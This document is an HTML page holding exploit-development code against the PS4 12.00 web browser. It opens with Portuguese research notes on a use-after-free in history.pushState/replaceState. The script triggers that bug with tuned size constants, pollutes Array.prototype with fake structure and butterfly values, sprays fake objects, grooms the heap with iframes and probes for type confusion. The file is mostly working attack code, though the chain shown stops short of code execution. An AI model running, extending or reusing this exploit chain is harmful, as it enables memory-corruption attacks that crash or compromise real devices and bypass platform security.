/* UAF Bug no history.pushState / replaceState / back Limite exato (~709k) 1 byte a mais ‚Üí crash determin√≠stico! const BASE = 977; const STEP = 14461; const UAF_ITERS = 48; nao alterar os valores! Freeze agressivo antes do crash, Janela est√°vel sem crash (47‚Äì49 itera√ß√µes) apos isso que novos testes devem ser inseridos! document.URL.length;
Strings / URL / ArrayBuffer charCodeAt em offsets progressivos antes / depois com press√£o, com pivot, com fragment split, com state split Resultado consistente:Buffer grande n√£o √© reutilizado üëâ Porta FECHADA: Strings / URL backing-store n√£o voltam ao heap reutiliz√°vel;
Obs1:O objeto UAF n√£o √© imediatamente reutiliz√°vel e n√£o sofre corrup√ß√£o vis√≠vel mas afeta o scheduler / layout / GC,Este N√ÉO √© um UAF ‚Äúcl√°ssico‚Äù de heap JS
N√£o √©:JSCell reaproveit√°vel, StringImpl reutiliz√°vel, Backing-store comum,Objeto exposto ao JS Ele se comporta como:
UAF em estrutura interna do WebCore / History,fora do alcance direto do JavaScript heap muito provavelmente:
HistoryItem, SerializedScriptValue,SecurityOrigin,DocumentLoader ou wrapper intermedi√°rio.
Portas fechadas: Leak por document.URL, Leak por location,Leak por history.state, Leak por strings grandes, Leak por ArrayBuffer, Overlap direto JS ‚Üî WebCore, Corrup√ß√£o silenciosa vis√≠vel;
A √öNICA porta que ainda est√° aberta √© ‚Äúleitura de mem√≥ria‚Äù, N√ÉO √© ‚Äúcorrup√ß√£o direta‚Äù, N√ÉO √© ‚Äúfakeobj‚Äù;
A porta aberta √©:DESINCRONIZA√á√ÉO TEMPORAL ENTRE CAMADAS (WebCore ‚Üî JSCore) Observe os sinais:Freeze agressivo, Nenhuma corrup√ß√£o vis√≠vel, Nenhum leak, Nenhum reuse, Mas comportamento global degradado, History.length muda, URL muda logicamente, Layout continua consistente;
Isso aponta para:
Objeto l√≥gico morto, mas ainda referenciado indiretamente n√£o pelo JS, mas por callbacks, loaders ou tarefas pendentes;
Ou seja:n√£o controla a mem√≥ria, Mas pode estar controlando ordem de execu√ß√£o, Estado inconsistente entre subsistemas, Isso N√ÉO d√° RCE direto.
Mas pode permitir:Bypass de invariantes, Uso de ponteiro inv√°lido internamente,Crash direcionado e √Äs vezes: Type Confusion indireta (dif√≠cil, mas poss√≠vel).
Ele precisaria de: Opcao 1 Um segundo bug Ou um bug vizinho (OOB, type confusion, UAF JSCell)
Alternativa vi√°vel:For√ßar uso de refer√™ncias vivas sem clone Ex.: uso de: replaceState, popstate ou reten√ß√£o indireta via closures O alvo n√£o √© mais o clone ‚Äî √© o tempo de vida cruzado.
Opcao 2: Prototype pollution controlada (n√£o gen√©rica), Hijack de m√©todos, Array / map afetados isso nao da RCE direto Mas d√° type confusion assistida, Isso permite:, For√ßar caminhos internos errados, Enganar verifica√ß√µes de tipo, Auxiliar UAF existente.
Obs 2: Conclus√£o parcial:
pushState como vetor prim√°rio ‚Üí morto
Lifetime bugs ‚Üí ainda vivos
UAF fora do history ‚Üí confirmado
Prototype pollution ‚Üí ativo
Esperar crash ‚Üí n√£o vai acontecer
Esperar inconsist√™ncia silenciosa ‚Üí correto;
*/

<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - Combined Primitives + UAF</title>
</head>
<body>
<h2>PS4 12.00 - UAF Trigger + Pollution + Reentrancy</h2>
<p>Status: <span id="status">Ready</span></p>

<button onclick="runFullChain()">EXPLOIT - Full Chain (UAF + Pollution + Getter)</button>

<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");

function log(m){ 
  logEl.textContent += m + "\n";
  logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

var keepAlive = [];

// UAF trigger constants (from your original discovery)
const BASE = 977;
const STEP = 14461;
const UAF_ITERS = 48;

// =====================================================
// EXPLOIT  - Full Chain
// =====================================================
async function runFullChain(){
  logEl.textContent = "";
  keepAlive = [];
  statusEl.textContent = "Running Full Chain...";
  
  log("=== EXPLOIT Full Chain (UAF + Pollution + Getter) ===\n");
  log("Goal: Combine all primitives for maximum effect\n");
  
  // Setup pollution
  log("[SETUP] Setting up pollution");
  
  Array.prototype.fakeStructureID = 0x11223344;
  Array.prototype.fakeButterfly = 0x55667788;
  Array.prototype.fakeLength = 0x1000;
  
  log("  Pollution active\n");
  
  let getterFired = 0;
  let allocatedObjects = [];
  
  log("[PHASE 1] Full UAF chain");
  
  let size = BASE;
  
  for(let i=0; i<UAF_ITERS; i++){
    let state = {
      index: i,
      data: [0x41, 0x42, 0x43, 0x44],
      get exploit() {
        getterFired++;
        
        if(i >= 45) { // Very close to crash point
          log(`    CRITICAL GETTER at ITER ${i}`);
          log(`    history.length: ${history.length}`);
          log(`    Pollution active: ${this.data.fakeStructureID === 0x11223344}`);
          
          // Allocate fake objects
          for(let j=0; j<100; j++) {
            let fakeObj = {
              vtable: 0xAABBCCDD,
              data: new ArrayBuffer(128),
              index: i * 100 + j
            };
            allocatedObjects.push(fakeObj);
          }
          
          log(`    Allocated 100 fake objects`);
          
          // Check if pollution is accessible
          if(this.data.fakeStructureID) {
            log(`    fakeStructureID: 0x${this.data.fakeStructureID.toString(16)}`);
          }
        }
        
        return "EXPLOIT_" + i;
      }
    };
    
    let frag = "E".repeat(size);
    
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    if(i % 10 === 0) {
      log(`  ITER ${i}: size=${size}`);
    }
    
    size += STEP;
    await sleep(5);
  }
  
  log(`\n  UAF complete, getter fired ${getterFired} times\n`);
  
  await sleep(120);
  
  // Heap grooming
  log("[PHASE 2] Heap grooming");
  let frames = [];
  for(let i=0; i<80; i++){
    let f = document.createElement("iframe");
    document.body.appendChild(f);
    try {
      let d = f.contentDocument;
      d.open();
      d.write("<html><body>G</body></html>");
      d.close();
    } catch(e){}
    frames.push(f);
  }
  frames.forEach(f=>f.remove());
  
  await sleep(80);
  
  // Verify combined primitives
  log("\n[PHASE 3] Verifying combined primitives");
  
  log(`Allocated objects: ${allocatedObjects.length}`);
  
  // Check fake objects
  let validFakes = 0;
  for(let obj of allocatedObjects) {
    if(obj.vtable === 0xAABBCCDD && obj.data) {
      validFakes++;
    }
  }
  
  log(`Valid fake objects: ${validFakes}/${allocatedObjects.length}`);
  
  // Check pollution in history
  if(history.state && history.state.data) {
    log("\nCurrent state pollution:");
    log(`  fakeStructureID: 0x${(history.state.data.fakeStructureID || 0).toString(16)}`);
    log(`  fakeButterfly: 0x${(history.state.data.fakeButterfly || 0).toString(16)}`);
    log(`  fakeLength: 0x${(history.state.data.fakeLength || 0).toString(16)}`);
  }
  
  // Navigate and check
  log("\n[PHASE 4] Navigate through states");
  
  for(let i=0; i<5; i++) {
    history.back();
    await sleep(50);
    
    if(history.state && history.state.data) {
      let struct = history.state.data.fakeStructureID || 0;
      log(`  Back ${i}: index=${history.state.index}, struct=0x${struct.toString(16)}`);
      
      // Try to trigger type confusion
      try {
        let len = history.state.data.length;
        let fakelen = history.state.data.fakeLength;
        
        if(fakelen && fakelen !== len) {
          log(`    Length mismatch: real=${len}, fake=0x${fakelen.toString(16)}`);
          log(`     TYPE CONFUSION DETECTED!`);
        }
      } catch(e) {}
    }
  }
  
  // Cleanup
  delete Array.prototype.fakeStructureID;
  delete Array.prototype.fakeButterfly;
  delete Array.prototype.fakeLength;
  
  log("\n=== EXPLOIT END ===");
  
  if(validFakes > 0 && history.state && history.state.data.fakeStructureID) {
    log("\n‚úì‚úì‚úì FULL CHAIN SUCCESS ‚úì‚úì‚úì");
    log("‚úì Pollution active through UAF");
    log("‚úì Getter executed in critical window");
    log("‚úì Fake objects allocated");
    log("‚úì Type confusion possible");
    statusEl.textContent = "FULL CHAIN SUCCESS";
  }
}

</script>
</body>
</html>
